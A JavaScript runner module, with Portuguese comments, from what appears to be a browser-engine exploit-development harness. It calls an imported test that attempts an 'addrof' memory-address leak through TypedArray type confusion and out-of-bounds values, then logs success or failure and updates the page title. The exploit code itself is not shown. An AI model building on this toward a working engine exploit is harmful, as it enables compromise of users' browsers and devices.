// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_AdvancedGetterLeak,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_AdvancedGetterLeak"; 
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_AdvancedGetterLeak(); 

    if (result.errorOccurred) { 
        logS3(`   RUNNER: Teste principal capturou ERRO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "critical", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: MainTest ERR!`; 
    } else if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
        logS3(`   RUNNER: Teste de Iteração de Valores OOB Concluído.`, "good", FNAME_RUNNER);
        logS3(`   RUNNER: Detalhes da última/melhor iteração (via result.toJSON_details): ${result.toJSON_details ? JSON.stringify(result.toJSON_details) : 'N/A'}`, "info", FNAME_RUNNER);
        logS3(`   RUNNER: Stringify Output da última/melhor iteração: ${result.stringifyResult ? JSON.stringify(result.stringifyResult) : 'N/A'}`, "info", FNAME_RUNNER);

        let overallHeisenbugOnM2 = false;
        // A lógica exata para overallHeisenbugOnM2 dependerá do que result.toJSON_details contiver.
        // Por agora, assumimos que se addrof_A_result ou addrof_B_result existirem, a TC ocorreu.
        if (result.addrof_A_result || result.addrof_B_result) { // Verificação simplificada
             if (result.toJSON_details && result.toJSON_details.this_is_M2 && result.toJSON_details.this_type === '[object Object]') {
                 overallHeisenbugOnM2 = true;
             }
        }
        
        let anyAddrofSuccess = false;
        if ((result.addrof_A_result && result.addrof_A_result.success) || (result.addrof_B_result && result.addrof_B_result.success)) {
            anyAddrofSuccess = true;
        }

        if (result.addrof_A_result) logS3(`    ADDROF M2.Getter (Last/Best Iter): ${result.addrof_A_result.msg}`, result.addrof_A_result.success ? "vuln" : "warn", FNAME_RUNNER);
        if (result.addrof_B_result) logS3(`    ADDROF M2.Direct (Last/Best Iter): ${result.addrof_B_result.msg}`, result.addrof_B_result.success ? "vuln" : "warn", FNAME_RUNNER);
        
        if (anyAddrofSuccess) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: AddrInM2 SUCCESS!`;
        } else if (overallHeisenbugOnM2) {
            logS3(`     !!!! TYPE CONFUSION NO M2 OBSERVADA (na iteração reportada) !!!!`, "critical", FNAME_RUNNER);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: M2_TC OK, Addr Fail`;
        } else {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: All Iter Tested, No M2_TC?`;
        }
    } else {
        logS3(`   RUNNER: Nenhuma iteração de resultado encontrada.`, "warn", FNAME_RUNNER);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: No Iter Results`;
    }

    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Heisenbug (${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCCESS") && !document.title.includes("Addr Fail") && 
            !document.title.includes("ERR") && !document.title.includes("Tested") && !document.title.includes("M2_TC OK")) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Iterations Done`;
        }
    }
}
